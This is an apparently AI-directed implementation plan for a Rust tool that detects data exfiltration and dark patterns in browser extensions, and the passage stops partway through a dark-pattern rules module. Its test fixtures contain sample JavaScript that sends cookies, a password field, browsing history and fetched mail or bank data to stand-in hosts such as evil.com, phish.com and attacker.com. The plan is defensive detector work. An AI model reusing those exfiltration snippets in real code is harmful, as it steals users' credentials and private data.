# Dark Pattern Detection Implementation Plan

> **For Claude:** REQUIRED SUB-SKILL: Use superpowers:executing-plans to implement this plan task-by-task.

**Goal:** Implement data flow source tracking, cross-domain exfiltration detection, and dark pattern analysis for browser extensions.

**Architecture:** Extend the existing `JsAnalyzer` with a `SourceTracker` that maps variables to their data origins. Add static dark pattern rules in a new module. Enhance LLM prompts with dark pattern analysis. Restructure endpoint output to group by URL.

**Tech Stack:** Rust, oxc (AST parsing), clap (CLI), existing rig-core LLM integration

---

## Phase 1: Data Models

### Task 1: Add DataSource enum

**Files:**
- Modify: `src/models/endpoint.rs`
- Test: `tests/javascript_tests.rs`

**Step 1: Write the failing test**

Add to `tests/javascript_tests.rs`:

```rust
#[test]
fn test_data_source_display() {
    use extanalyzer::models::DataSource;

    assert_eq!(DataSource::Cookie(None).to_string(), "Cookie");
    assert_eq!(DataSource::Cookie(Some("session".into())).to_string(), "Cookie(session)");
    assert_eq!(DataSource::LocalStorage("userId".into()).to_string(), "localStorage(userId)");
    assert_eq!(DataSource::NetworkResponse("api.example.com".into()).to_string(), "NetworkResponse(api.example.com)");
}
```

**Step 2: Run test to verify it fails**

Run: `cargo test test_data_source_display -- --exact`
Expected: FAIL with "cannot find type `DataSource`"

**Step 3: Write the implementation**

Add to `src/models/endpoint.rs` after the imports:

```rust
/// Represents the origin of data used in network requests
#[derive(Debug, Clone, PartialEq)]
pub enum DataSource {
    /// document.cookie access, optionally with specific cookie name
    Cookie(Option<String>),
    /// localStorage.getItem(key)
    LocalStorage(String),
    /// sessionStorage.getItem(key)
    SessionStorage(String),
    /// chrome.history.search results
    BrowsingHistory,
    /// DOM element content (e.g., querySelector(...).innerText)
    DomElement(String),
    /// User input field value
    UserInput(String),
    /// location.href, location.pathname, etc.
    Location(String),
    /// Data fetched from another URL
    NetworkResponse(String),
    /// Untracked variable
    Unknown(String),
}

impl std::fmt::Display for DataSource {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            DataSource::Cookie(None) => write!(f, "Cookie"),
            DataSource::Cookie(Some(name)) => write!(f, "Cookie({})", name),
            DataSource::LocalStorage(key) => write!(f, "localStorage({})", key),
            DataSource::SessionStorage(key) => write!(f, "sessionStorage({})", key),
            DataSource::BrowsingHistory => write!(f, "BrowsingHistory"),
            DataSource::DomElement(selector) => write!(f, "DOM({})", selector),
            DataSource::UserInput(field) => write!(f, "UserInput({})", field),
            DataSource::Location(prop) => write!(f, "location.{}", prop),
            DataSource::NetworkResponse(url) => write!(f, "NetworkResponse({})", url),
            DataSource::Unknown(name) => write!(f, "{}", name),
        }
    }
}
```

**Step 4: Run test to verify it passes**

Run: `cargo test test_data_source_display -- --exact`
Expected: PASS

**Step 5: Commit**

```bash
git add src/models/endpoint.rs tests/javascript_tests.rs
git commit -m "feat(models): add DataSource enum for tracking data origins"
```

---

### Task 2: Add EndpointFlag enum

**Files:**
- Modify: `src/models/endpoint.rs`
- Test: `tests/javascript_tests.rs`

**Step 1: Write the failing test**

Add to `tests/javascript_tests.rs`:

```rust
#[test]
fn test_endpoint_flag_severity() {
    use extanalyzer::models::{EndpointFlag, Severity};

    assert_eq!(EndpointFlag::CrossDomainTransfer { source_domain: "a.com".into() }.severity(), Severity::High);
    assert_eq!(EndpointFlag::SensitiveData.severity(), Severity::High);
    assert_eq!(EndpointFlag::KnownTracker.severity(), Severity::Medium);
}
```

**Step 2: Run test to verify it fails**

Run: `cargo test test_endpoint_flag_severity -- --exact`
Expected: FAIL with "cannot find type `EndpointFlag`"

**Step 3: Write the implementation**

Add to `src/models/endpoint.rs`:

```rust
use super::Severity;

/// Flags indicating suspicious characteristics of an endpoint
#[derive(Debug, Clone, PartialEq)]
pub enum EndpointFlag {
    /// Data from one domain is being sent to another
    CrossDomainTransfer { source_domain: String },
    /// Endpoint receives sensitive data (cookies, history, etc.)
    SensitiveData,
    /// Known tracking/analytics domain
    KnownTracker,
}

impl EndpointFlag {
    pub fn severity(&self) -> Severity {
        match self {
            EndpointFlag::CrossDomainTransfer { .. } => Severity::High,
            EndpointFlag::SensitiveData => Severity::High,
            EndpointFlag::KnownTracker => Severity::Medium,
        }
    }

    pub fn description(&self) -> String {
        match self {
            EndpointFlag::CrossDomainTransfer { source_domain } => {
                format!("Data from {} sent to different domain", source_domain)
            }
            EndpointFlag::SensitiveData => "Receives sensitive user data".to_string(),
            EndpointFlag::KnownTracker => "Known tracking/analytics endpoint".to_string(),
        }
    }
}
```

**Step 4: Run test to verify it passes**

Run: `cargo test test_endpoint_flag_severity -- --exact`
Expected: PASS

**Step 5: Commit**

```bash
git add src/models/endpoint.rs tests/javascript_tests.rs
git commit -m "feat(models): add EndpointFlag enum for endpoint warnings"
```

---

### Task 3: Update Endpoint struct

**Files:**
- Modify: `src/models/endpoint.rs`

**Step 1: Update the Endpoint struct**

Replace `payload_fields: Vec<String>` with new fields:

```rust
#[derive(Debug, Clone)]
pub struct Endpoint {
    pub url: String,
    pub method: Option<HttpMethod>,
    pub data_sources: Vec<DataSource>,
    pub location: Location,
    pub context: EndpointContext,
    pub description: Option<String>,
    pub flags: Vec<EndpointFlag>,
}

impl Endpoint {
    pub fn new(url: String, location: Location) -> Self {
        Self {
            url,
            method: None,
            data_sources: Vec::new(),
            location,
            context: EndpointContext::Unknown,
            description: None,
            flags: Vec::new(),
        }
    }

    pub fn with_method(mut self, method: HttpMethod) -> Self {
        self.method = Some(method);
        self
    }

    pub fn with_data_sources(mut self, sources: Vec<DataSource>) -> Self {
        self.data_sources = sources;
        self
    }

    pub fn with_context(mut self, context: EndpointContext) -> Self {
        self.context = context;
        self
    }

    pub fn with_flag(mut self, flag: EndpointFlag) -> Self {
        self.flags.push(flag);
        self
    }

    /// Get the highest severity from all flags
    pub fn max_flag_severity(&self) -> Option<Severity> {
        self.flags.iter().map(|f| f.severity()).min()  // min because Critical < High < Medium etc.
    }
}
```

**Step 2: Fix compilation errors**

Run: `cargo check`

Update `src/output/terminal.rs` - change `payload_fields` references to `data_sources`:

In `print_endpoints_section`, update the HashMap type and merging logic:

```rust
let mut grouped: HashMap<String, Vec<(Option<HttpMethod>, Location, Vec<DataSource>, EndpointContext, Vec<EndpointFlag>)>> = HashMap::new();

for endpoint in endpoints {
    let entry = grouped.entry(endpoint.url.clone()).or_insert_with(Vec::new);
    entry.push((
        endpoint.method.clone(),
        endpoint.location.clone(),
        endpoint.data_sources.clone(),
        endpoint.context.clone(),
        endpoint.flags.clone(),
    ));
}
```

**Step 3: Run tests to verify nothing broke**

Run: `cargo test`
Expected: PASS (all existing tests)

**Step 4: Commit**

```bash
git add src/models/endpoint.rs src/output/terminal.rs
git commit -m "feat(models): update Endpoint struct with data_sources and flags"
```

---

### Task 4: Add DarkPatternType enum

**Files:**
- Modify: `src/models/finding.rs`
- Test: `tests/javascript_tests.rs`

**Step 1: Write the failing test**

Add to `tests/javascript_tests.rs`:

```rust
#[test]
fn test_dark_pattern_type_category() {
    use extanalyzer::models::{DarkPatternType, Category};

    let dp = DarkPatternType::AffiliateInjection;
    let cat = Category::DarkPattern(dp);
    assert_eq!(cat.as_str(), "Dark Pattern");
}
```

**Step 2: Run test to verify it fails**

Run: `cargo test test_dark_pattern_type_category -- --exact`
Expected: FAIL with "cannot find type `DarkPatternType`"

**Step 3: Write the implementation**

Add to `src/models/finding.rs`:

```rust
/// Types of dark patterns that can be detected
#[derive(Debug, Clone, PartialEq)]
pub enum DarkPatternType {
    // Monetization
    AffiliateInjection,
    AdInjection,
    SearchHijacking,

    // Privacy
    HiddenTracking,
    ExcessiveCollection,
    Fingerprinting,
    DataExfiltration,

    // Manipulation
    ReviewNagging,
    NotificationSpam,
    FakeUrgency,
    DisguisedAds,

    // Bait-and-switch
    PermissionCreep,
    HiddenFunctionality,
    MisleadingDescription,
}

impl DarkPatternType {
    pub fn as_str(&self) -> &'static str {
        match self {
            DarkPatternType::AffiliateInjection => "Affiliate Injection",
            DarkPatternType::AdInjection => "Ad Injection",
            DarkPatternType::SearchHijacking => "Search Hijacking",
            DarkPatternType::HiddenTracking => "Hidden Tracking",
            DarkPatternType::ExcessiveCollection => "Excessive Collection",
            DarkPatternType::Fingerprinting => "Fingerprinting",
            DarkPatternType::DataExfiltration => "Data Exfiltration",
            DarkPatternType::ReviewNagging => "Review Nagging",
            DarkPatternType::NotificationSpam => "Notification Spam",
            DarkPatternType::FakeUrgency => "Fake Urgency",
            DarkPatternType::DisguisedAds => "Disguised Ads",
            DarkPatternType::PermissionCreep => "Permission Creep",
            DarkPatternType::HiddenFunctionality => "Hidden Functionality",
            DarkPatternType::MisleadingDescription => "Misleading Description",
        }
    }

    pub fn category_name(&self) -> &'static str {
        match self {
            DarkPatternType::AffiliateInjection
            | DarkPatternType::AdInjection
            | DarkPatternType::SearchHijacking => "Monetization",

            DarkPatternType::HiddenTracking
            | DarkPatternType::ExcessiveCollection
            | DarkPatternType::Fingerprinting
            | DarkPatternType::DataExfiltration => "Privacy",

            DarkPatternType::ReviewNagging
            | DarkPatternType::NotificationSpam
            | DarkPatternType::FakeUrgency
            | DarkPatternType::DisguisedAds => "Manipulation",

            DarkPatternType::PermissionCreep
            | DarkPatternType::HiddenFunctionality
            | DarkPatternType::MisleadingDescription => "Bait-and-Switch",
        }
    }
}
```

Update the `Category` enum:

```rust
#[derive(Debug, Clone, PartialEq)]
pub enum Category {
    Permission,
    ApiUsage,
    Network,
    Obfuscation,
    Cryptography,
    DataAccess,
    DarkPattern(DarkPatternType),
}

impl Category {
    pub fn as_str(&self) -> &'static str {
        match self {
            Category::Permission => "Permission",
            Category::ApiUsage => "API Usage",
            Category::Network => "Network",
            Category::Obfuscation => "Obfuscation",
            Category::Cryptography => "Cryptography",
            Category::DataAccess => "Data Access",
            Category::DarkPattern(_) => "Dark Pattern",
        }
    }
}
```

**Step 4: Run test to verify it passes**

Run: `cargo test test_dark_pattern_type_category -- --exact`
Expected: PASS

**Step 5: Commit**

```bash
git add src/models/finding.rs tests/javascript_tests.rs
git commit -m "feat(models): add DarkPatternType enum and Category::DarkPattern"
```

---

## Phase 2: Source Tracking

### Task 5: Create SourceTracker struct

**Files:**
- Modify: `src/analyze/javascript.rs`
- Test: `tests/javascript_tests.rs`

**Step 1: Write the failing test**

Add to `tests/javascript_tests.rs`:

```rust
#[test]
fn test_source_tracker_local_storage() {
    let code = r#"
        let userId = localStorage.getItem('user_id');
        fetch('https://api.example.com/track', { body: userId });
    "#;

    let (findings, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    assert!(!endpoints.is_empty());
    let endpoint = endpoints.iter().find(|e| e.url.contains("api.example.com")).unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::LocalStorage(k) if k == "user_id")));
}
```

**Step 2: Run test to verify it fails**

Run: `cargo test test_source_tracker_local_storage -- --exact`
Expected: FAIL (data_sources will be empty)

**Step 3: Write the implementation**

Add to `src/analyze/javascript.rs` after the imports:

```rust
use std::collections::HashMap;

/// Tracks the data sources of variables through the AST
#[derive(Debug, Default)]
struct SourceTracker {
    /// Maps variable names to their data sources
    bindings: HashMap<String, Vec<DataSource>>,
}

impl SourceTracker {
    fn new() -> Self {
        Self::default()
    }

    /// Record a binding from a variable to data sources
    fn bind(&mut self, name: &str, sources: Vec<DataSource>) {
        self.bindings.insert(name.to_string(), sources);
    }

    /// Look up the sources for a variable, returning Unknown if not tracked
    fn lookup(&self, name: &str) -> Vec<DataSource> {
        self.bindings
            .get(name)
            .cloned()
            .unwrap_or_else(|| vec![DataSource::Unknown(name.to_string())])
    }

    /// Propagate sources from one variable to another (for assignments like `let y = x`)
    fn propagate(&mut self, from: &str, to: &str) {
        if let Some(sources) = self.bindings.get(from).cloned() {
            self.bindings.insert(to.to_string(), sources);
        }
    }
}
```

Add `source_tracker: SourceTracker` field to `JsAnalyzer`:

```rust
struct JsAnalyzer<'a> {
    findings: Vec<Finding>,
    endpoints: Vec<Endpoint>,
    source_text: &'a str,
    file_path: &'a Path,
    source_tracker: SourceTracker,
}

impl<'a> JsAnalyzer<'a> {
    fn new(source_text: &'a str, file_path: &'a Path) -> Self {
        Self {
            findings: Vec::new(),
            endpoints: Vec::new(),
            source_text,
            file_path,
            source_tracker: SourceTracker::new(),
        }
    }
    // ... rest unchanged
}
```

**Step 4: Continue with detection implementation in next tasks**

This task sets up the structure. The actual detection happens in subsequent tasks.

**Step 5: Commit**

```bash
git add src/analyze/javascript.rs tests/javascript_tests.rs
git commit -m "feat(analyze): add SourceTracker struct for data flow tracking"
```

---

### Task 6: Detect localStorage/sessionStorage sources

**Files:**
- Modify: `src/analyze/javascript.rs`

**Step 1: Implement detection in visit_call_expression**

Add method to `JsAnalyzer`:

```rust
/// Check if this call is a storage access and track it
fn check_storage_access(&mut self, call_expr: &CallExpression<'_>) -> Option<DataSource> {
    if let Some(chain) = self.get_member_chain(&call_expr.callee) {
        if chain.len() >= 2 {
            let obj = &chain[0];
            let method = &chain[1];

            if method == "getItem" {
                // Get the key from first argument
                let key = call_expr.arguments.first()
                    .and_then(|arg| {
                        if let Argument::StringLiteral(lit) = arg {
                            Some(lit.value.to_string())
                        } else {
                            Some("*".to_string())
                        }
                    })
                    .unwrap_or_else(|| "*".to_string());

                match obj.as_str() {
                    "localStorage" => return Some(DataSource::LocalStorage(key)),
                    "sessionStorage" => return Some(DataSource::SessionStorage(key)),
                    _ => {}
                }
            }
        }
    }
    None
}
```

Update `visit_statement` for variable declarations to track sources:

```rust
Statement::VariableDeclaration(var_decl) => {
    for decl in &var_decl.declarations {
        if let Some(ref init) = decl.init {
            // Check if init is a call expression that returns a data source
            if let Expression::CallExpression(call_expr) = init {
                if let Some(source) = self.check_storage_access(call_expr) {
                    // Get variable name
                    if let oxc_ast::ast::BindingPatternKind::BindingIdentifier(ident) = &decl.id.kind {
                        self.source_tracker.bind(&ident.name, vec![source]);
                    }
                }
            }
            self.visit_expression(init);
        }
    }
}
```

**Step 2: Run the test**

Run: `cargo test test_source_tracker_local_storage -- --exact`
Expected: Still failing - need to propagate to fetch calls (next task)

**Step 3: Commit partial progress**

```bash
git add src/analyze/javascript.rs
git commit -m "feat(analyze): detect localStorage/sessionStorage getItem calls"
```

---

### Task 7: Propagate sources to fetch calls

**Files:**
- Modify: `src/analyze/javascript.rs`

**Step 1: Update handle_fetch_call to use SourceTracker**

```rust
fn handle_fetch_call(&mut self, call_expr: &CallExpression<'_>) {
    // Get the first argument (URL)
    let url = if let Some(first_arg) = call_expr.arguments.first() {
        match first_arg {
            Argument::StringLiteral(lit) => Some(lit.value.to_string()),
            Argument::TemplateLiteral(tmpl) => {
                // Simple case: just get the first quasi
                tmpl.quasis.first().map(|q| q.value.raw.to_string())
            }
            _ => None
        }
    } else {
        None
    };

    let Some(url) = url else { return };

    let mut endpoint = Endpoint::new(url.clone(), self.location_from_span(call_expr.span));

    // Determine method and collect data sources from body
    let mut data_sources = Vec::new();

    if call_expr.arguments.len() > 1 {
        if let Some(Argument::ObjectExpression(opts)) = call_expr.arguments.get(1) {
            for prop in &opts.properties {
                if let oxc_ast::ast::ObjectPropertyKind::ObjectProperty(prop) = prop {
                    let key = match &prop.key {
                        oxc_ast::ast::PropertyKey::StaticIdentifier(ident) => Some(ident.name.as_str()),
                        _ => None
                    };

                    match key {
                        Some("method") => {
                            if let Expression::StringLiteral(lit) = &prop.value {
                                endpoint = endpoint.with_method(match lit.value.to_uppercase().as_str() {
                                    "GET" => HttpMethod::Get,
                                    "POST" => HttpMethod::Post,
                                    "PUT" => HttpMethod::Put,
                                    "DELETE" => HttpMethod::Delete,
                                    "PATCH" => HttpMethod::Patch,
                                    other => HttpMethod::Other(other.to_string()),
                                });
                            }
                        }
                        Some("body") => {
                            // Track what data is being sent
                            data_sources.extend(self.extract_data_sources(&prop.value));
                        }
                        _ => {}
                    }
                }
            }
        }
        if endpoint.method.is_none() {
            endpoint = endpoint.with_method(HttpMethod::Post);
        }
    } else {
        endpoint = endpoint.with_method(HttpMethod::Get);
    }

    endpoint = endpoint
        .with_data_sources(data_sources)
        .with_context(classify_url(&url));

    self.endpoints.push(endpoint);
}

/// Extract data sources from an expression (variable reference, object, etc.)
fn extract_data_sources(&self, expr: &Expression<'_>) -> Vec<DataSource> {
    match expr {
        Expression::Identifier(ident) => {
            self.source_tracker.lookup(&ident.name)
        }
        Expression::ObjectExpression(obj) => {
            let mut sources = Vec::new();
            for prop in &obj.properties {
                if let oxc_ast::ast::ObjectPropertyKind::ObjectProperty(prop) = prop {
                    sources.extend(self.extract_data_sources(&prop.value));
                }
            }
            sources
        }
        Expression::CallExpression(call) => {
            // Check for JSON.stringify(x)
            if let Some(chain) = self.get_member_chain(&call.callee) {
                if chain == ["JSON", "stringify"] {
                    if let Some(arg) = call.arguments.first() {
                        if let Some(expr) = arg.as_expression() {
                            return self.extract_data_sources(expr);
                        }
                    }
                }
            }
            Vec::new()
        }
        _ => Vec::new()
    }
}
```

**Step 2: Run the test**

Run: `cargo test test_source_tracker_local_storage -- --exact`
Expected: PASS

**Step 3: Commit**

```bash
git add src/analyze/javascript.rs
git commit -m "feat(analyze): propagate data sources to fetch calls"
```

---

### Task 8: Detect document.cookie source

**Files:**
- Modify: `src/analyze/javascript.rs`
- Test: `tests/javascript_tests.rs`

**Step 1: Write the failing test**

```rust
#[test]
fn test_source_tracker_document_cookie() {
    let code = r#"
        let cookies = document.cookie;
        fetch('https://evil.com/steal', { body: cookies });
    "#;

    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    let endpoint = endpoints.iter().find(|e| e.url.contains("evil.com")).unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::Cookie(_))));
}
```

**Step 2: Run test to verify it fails**

Run: `cargo test test_source_tracker_document_cookie -- --exact`
Expected: FAIL

**Step 3: Implement detection**

Add to `JsAnalyzer`:

```rust
/// Check if expression is document.cookie access
fn check_cookie_access(&self, expr: &Expression<'_>) -> Option<DataSource> {
    if let Some(chain) = self.get_member_chain(expr) {
        if chain.len() == 2 && chain[0] == "document" && chain[1] == "cookie" {
            return Some(DataSource::Cookie(None));
        }
    }
    None
}
```

Update variable declaration handling to also check for member expressions:

```rust
// In visit_statement, VariableDeclaration case:
if let Expression::StaticMemberExpression(_) = init {
    if let Some(source) = self.check_cookie_access(init) {
        if let oxc_ast::ast::BindingPatternKind::BindingIdentifier(ident) = &decl.id.kind {
            self.source_tracker.bind(&ident.name, vec![source]);
        }
    }
}
```

**Step 4: Run test to verify it passes**

Run: `cargo test test_source_tracker_document_cookie -- --exact`
Expected: PASS

**Step 5: Commit**

```bash
git add src/analyze/javascript.rs tests/javascript_tests.rs
git commit -m "feat(analyze): detect document.cookie data source"
```

---

### Task 9: Detect location.* sources

**Files:**
- Modify: `src/analyze/javascript.rs`
- Test: `tests/javascript_tests.rs`

**Step 1: Write the failing test**

```rust
#[test]
fn test_source_tracker_location() {
    let code = r#"
        let url = location.href;
        fetch('https://tracker.com/log', { body: url });
    "#;

    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    let endpoint = endpoints.iter().find(|e| e.url.contains("tracker.com")).unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::Location(p) if p == "href")));
}
```

**Step 2: Implement detection**

```rust
fn check_location_access(&self, expr: &Expression<'_>) -> Option<DataSource> {
    if let Some(chain) = self.get_member_chain(expr) {
        if chain.len() >= 2 {
            let first = &chain[0];
            if first == "location" || first == "window" && chain.get(1).map(|s| s.as_str()) == Some("location") {
                let prop = chain.last().unwrap();
                if ["href", "pathname", "search", "hash", "hostname", "origin"].contains(&prop.as_str()) {
                    return Some(DataSource::Location(prop.clone()));
                }
            }
        }
    }
    None
}
```

**Step 3: Run test, verify pass, commit**

```bash
cargo test test_source_tracker_location -- --exact
git add src/analyze/javascript.rs tests/javascript_tests.rs
git commit -m "feat(analyze): detect location.* data sources"
```

---

### Task 10: Detect chrome.history.search source

**Files:**
- Modify: `src/analyze/javascript.rs`
- Test: `tests/javascript_tests.rs`

**Step 1: Write the failing test**

```rust
#[test]
fn test_source_tracker_history() {
    let code = r#"
        let history = await chrome.history.search({ text: '' });
        fetch('https://spy.com/collect', { body: JSON.stringify(history) });
    "#;

    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    let endpoint = endpoints.iter().find(|e| e.url.contains("spy.com")).unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::BrowsingHistory)));
}
```

**Step 2: Implement detection**

```rust
fn check_history_access(&self, call_expr: &CallExpression<'_>) -> Option<DataSource> {
    if let Some(chain) = self.get_member_chain(&call_expr.callee) {
        if chain.len() >= 3 {
            let is_chrome_or_browser = chain[0] == "chrome" || chain[0] == "browser";
            if is_chrome_or_browser && chain[1] == "history" && chain[2] == "search" {
                return Some(DataSource::BrowsingHistory);
            }
        }
    }
    None
}
```

**Step 3: Run test, verify pass, commit**

```bash
cargo test test_source_tracker_history -- --exact
git add src/analyze/javascript.rs tests/javascript_tests.rs
git commit -m "feat(analyze): detect chrome.history.search data source"
```

---

### Task 11: Detect DOM element and user input sources

**Files:**
- Modify: `src/analyze/javascript.rs`
- Test: `tests/javascript_tests.rs`

**Step 1: Write the failing test**

```rust
#[test]
fn test_source_tracker_user_input() {
    let code = r#"
        let password = document.getElementById('password').value;
        fetch('https://phish.com/steal', { body: password });
    "#;

    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    let endpoint = endpoints.iter().find(|e| e.url.contains("phish.com")).unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::UserInput(id) if id == "password")));
}
```

**Step 2: Implement detection**

```rust
fn check_dom_access(&self, expr: &Expression<'_>) -> Option<DataSource> {
    // Check for document.getElementById('x').value pattern
    if let Expression::StaticMemberExpression(member) = expr {
        if member.property.name == "value" {
            if let Expression::CallExpression(call) = &member.object {
                if let Some(chain) = self.get_member_chain(&call.callee) {
                    if chain == ["document", "getElementById"] {
                        if let Some(Argument::StringLiteral(lit)) = call.arguments.first() {
                            return Some(DataSource::UserInput(lit.value.to_string()));
                        }
                    }
                }
            }
        }
        // Check for document.querySelector(...).innerText/textContent
        if member.property.name == "innerText" || member.property.name == "textContent" {
            if let Expression::CallExpression(call) = &member.object {
                if let Some(chain) = self.get_member_chain(&call.callee) {
                    if chain == ["document", "querySelector"] || chain == ["document", "querySelectorAll"] {
                        if let Some(Argument::StringLiteral(lit)) = call.arguments.first() {
                            return Some(DataSource::DomElement(lit.value.to_string()));
                        }
                    }
                }
            }
        }
    }
    None
}
```

**Step 3: Run test, verify pass, commit**

```bash
cargo test test_source_tracker_user_input -- --exact
git add src/analyze/javascript.rs tests/javascript_tests.rs
git commit -m "feat(analyze): detect DOM element and user input data sources"
```

---

### Task 12: Track network response sources

**Files:**
- Modify: `src/analyze/javascript.rs`
- Test: `tests/javascript_tests.rs`

**Step 1: Write the failing test**

```rust
#[test]
fn test_source_tracker_network_response() {
    let code = r#"
        let response = await fetch('https://mail.google.com/api/inbox');
        let emails = await response.json();
        fetch('https://attacker.com/exfil', { body: JSON.stringify(emails) });
    "#;

    let (_, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    let endpoint = endpoints.iter().find(|e| e.url.contains("attacker.com")).unwrap();
    assert!(endpoint.data_sources.iter().any(|s| matches!(s, extanalyzer::models::DataSource::NetworkResponse(url) if url.contains("mail.google.com"))));
}
```

**Step 2: Implement detection**

Track fetch response assignments by recording the URL when a variable is assigned a fetch call:

```rust
// When processing: let response = await fetch('url');
// And later: let data = await response.json();

fn check_fetch_response(&mut self, call_expr: &CallExpression<'_>) -> Option<(String, DataSource)> {
    if let Some(name) = self.get_callee_name(&call_expr.callee) {
        if name == "fetch" {
            if let Some(Argument::StringLiteral(lit)) = call_expr.arguments.first() {
                let url = lit.value.to_string();
                // Extract domain for simpler tracking
                let domain = url
                    .trim_start_matches("https://")
                    .trim_start_matches("http://")
                    .split('/')
                    .next()
                    .unwrap_or(&url)
                    .to_string();
                return Some((url.clone(), DataSource::NetworkResponse(domain)));
            }
        }
    }
    None
}
```

Track `.json()` and `.text()` method calls that derive from response variables.

**Step 3: Run test, verify pass, commit**

```bash
cargo test test_source_tracker_network_response -- --exact
git add src/analyze/javascript.rs tests/javascript_tests.rs
git commit -m "feat(analyze): track network response data sources"
```

---

## Phase 3: Cross-Request Detection

### Task 13: Detect cross-domain data transfer

**Files:**
- Modify: `src/analyze/javascript.rs`
- Test: `tests/javascript_tests.rs`

**Step 1: Write the failing test**

```rust
#[test]
fn test_cross_domain_transfer_detection() {
    let code = r#"
        let response = await fetch('https://bank.com/api/accounts');
        let data = await response.json();
        fetch('https://evil.com/steal', { body: JSON.stringify(data) });
    "#;

    let (findings, endpoints) = extanalyzer::analyze::javascript::analyze_javascript(
        code,
        std::path::Path::new("test.js"),
    );

    // Should have a flag on the evil.com endpoint
    let endpoint = endpoints.iter().find(|e| e.url.contains("evil.com")).unwrap();
    assert!(endpoint.flags.iter().any(|f| matches!(f, extanalyzer::models::EndpointFlag::CrossDomainTransfer { source_domain } if source_domain.contains("bank.com"))));

    // Should also have a finding
    assert!(findings.iter().any(|f| f.title.contains("Cross-domain") || f.title.contains("Data Exfiltration")));
}
```

**Step 2: Implement detection**

After collecting data sources for an endpoint, check if any NetworkResponse sources are from different domains:

```rust
fn check_cross_domain_transfer(&self, endpoint: &mut Endpoint) {
    let target_domain = endpoint.url
        .trim_start_matches("https://")
        .trim_start_matches("http://")
        .split('/')
        .next()
        .unwrap_or("");

    for source in &endpoint.data_sources {
        if let DataSource::NetworkResponse(source_domain) = source {
            if source_domain != target_domain && !self.is_same_root_domain(source_domain, target_domain) {
                endpoint.flags.push(EndpointFlag::CrossDomainTransfer {
                    source_domain: source_domain.clone(),
                });
            }
        }
    }
}

fn is_same_root_domain(&self, domain1: &str, domain2: &str) -> bool {
    // Simple check: compare last two parts of domain
    let parts1: Vec<_> = domain1.split('.').collect();
    let parts2: Vec<_> = domain2.split('.').collect();

    if parts1.len() >= 2 && parts2.len() >= 2 {
        let root1 = format!("{}.{}", parts1[parts1.len()-2], parts1[parts1.len()-1]);
        let root2 = format!("{}.{}", parts2[parts2.len()-2], parts2[parts2.len()-1]);
        return root1 == root2;
    }
    false
}
```

Also create a Finding for cross-domain transfers:

```rust
// After detecting cross-domain transfer:
self.findings.push(
    Finding::new(
        Severity::High,
        Category::DarkPattern(DarkPatternType::DataExfiltration),
        "Cross-domain data transfer detected",
    )
    .with_description(format!(
        "Data from {} is being sent to {}",
        source_domain, target_domain
    ))
    .with_location(self.location_from_span(call_expr.span))
);
```

**Step 3: Run test, verify pass, commit**

```bash
cargo test test_cross_domain_transfer_detection -- --exact
git add src/analyze/javascript.rs tests/javascript_tests.rs
git commit -m "feat(analyze): detect cross-domain data transfers"
```

---

## Phase 4: Dark Pattern Static Rules

### Task 14: Create dark_patterns.rs module

**Files:**
- Create: `src/analyze/dark_patterns.rs`
- Modify: `src/analyze/mod.rs`

**Step 1: Create the module file**

```rust
//! Dark pattern detection rules

use crate::models::{Category, DarkPatternType, Finding, Location, Severity};
use once_cell::sync::Lazy;
use regex::Regex;
use std::path::Path;

/// Known affiliate network domains
const AFFILIATE_DOMAINS: &[&str] = &[
    "shareasale.com",
    "commission-junction.com",
    "cj.com",
    "linksynergy.com",
    "awin1.com",
    "impact.com",
    "partnerize.com",
    "pepperjam.com",
];

/// Known ad network domains
const AD_NETWORK_DOMAINS: &[&str] = &[
    "doubleclick.net",
    "googlesyndication.com",
    "googleadservices.com",
    "facebook.com/tr",
    "amazon-adsystem.com",
    "adnxs.com",
    "criteo.com",
    "taboola.com",
    "outbrain.com",
];

/// Patterns for affiliate link injection
static AFFILIATE_PARAM_PATTERN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"[?&](ref|affiliate|aff|tag|utm_source)="#).unwrap()
});

/// Patterns for review nagging
static REVIEW_URL_PATTERN: Lazy<Regex> = Lazy::new(|| {
    Regex::new(r#"chrome\.google\.com/webstore/detail|addons\.mozilla\.org.*reviews"#).unwrap()
});

/// Analyze code for dark patterns
pub fn analyze_dark_patterns(source: &str, file_path: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Check for various dark patterns
    findings.extend(check_affiliate_injection(source, file_path));
    findings.extend(check_review_nagging(source, file_path));
    findings.extend(check_notification_spam(source, file_path));
    findings.extend(check_fingerprinting(source, file_path));

    findings
}

fn check_affiliate_injection(source: &str, file_path: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Check for affiliate parameter injection
    for (line_num, line) in source.lines().enumerate() {
        if AFFILIATE_PARAM_PATTERN.is_match(line) && line.contains("href") {
            findings.push(
                Finding::new(
                    Severity::High,
                    Category::DarkPattern(DarkPatternType::AffiliateInjection),
                    "Potential affiliate link injection",
                )
                .with_description("Code modifies links to add affiliate tracking parameters")
                .with_location(Location {
                    file: file_path.to_path_buf(),
                    line: Some(line_num + 1),
                    column: None,
                })
            );
        }
    }

    findings
}

fn check_review_nagging(source: &str, file_path: &Path) -> Vec<Finding> {
    let mut findings = Vec::new();

    // Check for setUninstallURL with review links
    if source.contains("setUninstallURL") && REVIEW_URL_PATTERN.is_match(source) {
        findings.push(
            Finding::new(
                Severity::Medium,
                Category::DarkPattern(DarkPatternType::ReviewNagging),
